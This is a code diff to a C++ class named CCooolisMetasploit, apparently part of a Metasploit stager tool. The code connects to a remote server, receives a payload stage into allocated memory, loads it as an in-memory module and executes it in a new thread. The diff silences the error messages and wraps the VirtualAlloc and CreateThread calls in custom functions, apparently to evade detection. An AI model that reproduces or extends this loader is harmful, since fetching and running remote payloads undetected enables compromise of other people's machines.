@@ -8,7 +8,7 @@ CCooolisMetasploit::CCooolisMetasploit()
 	this->getStager = new stager;  // 发送数据结构体
 	if (WSAStartup(sockVersion, &wsaData) != 0)
 	{
-		std::cout << "[!] WSAStartup Error " << GetLastError() << std::endl;
+		// 
 	}
 
 }
@@ -39,7 +39,7 @@ BOOL CCooolisMetasploit::RecvStage()
 	
 	// 等待三秒执行
 	// Sleep(3000);
-	this->pSpace = (CHAR*)VirtualAlloc(NULL, dwStageLength, MEM_COMMIT, PAGE_READWRITE);
+	this->pSpace = (CHAR*)CooolisVirtualAlloc(NULL, dwStageLength, MEM_COMMIT, PAGE_READWRITE);
 
 	// 将Stage放入内存页
 	if (recv(socks, pSpace, dwStageLength, 0) == SOCKET_ERROR) {
@@ -62,7 +62,6 @@ BOOL CCooolisMetasploit::ConnectServer(std::string host, USHORT port)
 	sock_addr.sin_port = htons(port);  // 套接字端口
 	// 连接服务器
 	if (connect(socks, (struct sockaddr*) & sock_addr, sizeof(sock_addr)) == SOCKET_ERROR) {
-		std::cout << "[!] Connect error ! " << GetLastError() << std::endl;
 		return FALSE;
 	}
 	return TRUE;
@@ -79,7 +78,7 @@ VOID CCooolisMetasploit::GoodCooolis()
 	// hModule = MemoryLoadLibrary(NULL);
 	DllMain = (Module)MemoryGetProcAddress(hModule, cFunctionName);
 
-	hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)DllMain, NULL, NULL, &dwThread);
+	hThread = CooolisCreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)DllMain, NULL, NULL, &dwThread);
 
 	WaitForSingleObject(hThread, INFINITE);
 
